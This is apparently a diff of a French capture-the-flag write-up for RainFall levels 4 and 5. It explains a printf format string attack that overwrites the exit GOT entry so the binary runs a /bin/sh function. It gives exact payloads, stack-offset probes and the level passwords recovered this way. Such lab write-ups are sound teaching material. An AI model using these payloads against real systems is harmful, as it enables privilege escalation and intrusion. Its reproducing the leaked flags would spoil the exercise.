@@ -1,16 +1,22 @@
-# Level 4
+# Level 5
 
-En ouvrant level4 avec cutter on voit que le main appelle une fonction `n` qui lit l'entre standard et envoie le resultat a une fonction `p` qui printf ce dernier. Mais le printf ne precise pas le type ce qui nous permet d'utiliser une string attack comme a l'exercie precedant. Il faut donc commancer par trouver ladresse du parametre de printf comme dans lexercice precedant.
+On vas encore une fois utiliser une format string attaque.
+cette fois nous avons une fonction `n` appeler dans le main qui va appeler comme les fois precedante printf avec le retour de l'entrer standard lue avec `fget`. Mais cette foi pas de condition qui donne les droit, elle exit apres le printf, par contre nous avons une fonction `o` a l'adresse `0x080484a4` non-appeler qui execute un `"/bin/sh"` donc il faut donc appeler la fonction `o` a la place de `exite` a l'adresse `0x8049838`.
+
+En utilisant la meme logique que les levels precedents on cherche la position dans la stack ici on voit que l'adresse est en 4 position.
 ```
-level4@RainFall:~$ python -c "print 'aaaa' + '%x ' * 12 " | ./level4 
-aaaab7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 
-level4@RainFall:~$ 
+level5@RainFall:~$ python -c "print 'aaaa' + ' %x' * 4" | ./level5 
+aaaa 200 b7fd1ac0 b7ff37d0 61616161
+level5@RainFall:~$ 
 ```
- La différence est que la condition qui suit l'appel de p compare m avec `0x1025544` = 16930116, donc il faut cree un payload qui va utiliser le `%[n]d` qui va afficher n space les compter grace au `%n` et les stocker dans l'adresse de `m`.
+On injecte donc l'adresse de la fonction o a la place de l'exit initialement appeler. Il nous faut donc l'adresse de o en decimal - 4 octets `0x080484a4` = `134513828` 134513828 - 4 = 134513824
+
+ - `0x080484a4` = 134513828
+ - 134513828 - 4 = 134513824
 ```
-level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%16930112d%12\$n'" | ./level4
- 
- [...]    
-																-1208015184
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824d%4\$n'" > /tmp/payload
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
